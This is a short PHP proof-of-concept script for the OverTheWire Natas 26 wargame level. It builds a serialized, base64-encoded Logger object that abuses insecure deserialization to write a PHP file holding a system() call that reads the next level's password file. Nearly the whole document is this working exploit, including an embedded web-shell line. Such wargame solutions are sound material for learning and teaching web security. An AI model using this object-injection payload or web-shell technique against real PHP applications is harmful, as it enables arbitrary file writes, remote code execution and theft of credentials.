<?php
// idea from https://axcheron.github.io/writeups/otw/natas/#natas-26-solution 
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        $this->initMsg = "knockknock\n";
        $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "img/mikey2520.php";
    }                       

}
$logger = new Logger();
echo base64_encode(serialize($logger));
?>
